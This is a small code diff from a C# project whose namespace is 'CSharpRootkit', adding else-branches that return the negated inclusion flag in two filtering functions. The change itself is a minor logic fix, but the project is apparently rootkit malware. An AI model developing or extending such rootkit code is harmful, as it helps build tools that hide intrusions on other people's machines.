@@ -470,6 +470,10 @@ namespace CSharpRootkit
                 }
 
             }
+            else
+            {
+                return !isInclusion;
+            }
 
             return isInclusion;
 
@@ -509,7 +513,10 @@ namespace CSharpRootkit
                 }
 
             }
-
+            else
+            {
+                return !isInclusion;
+            }
             return isInclusion;
         }
 
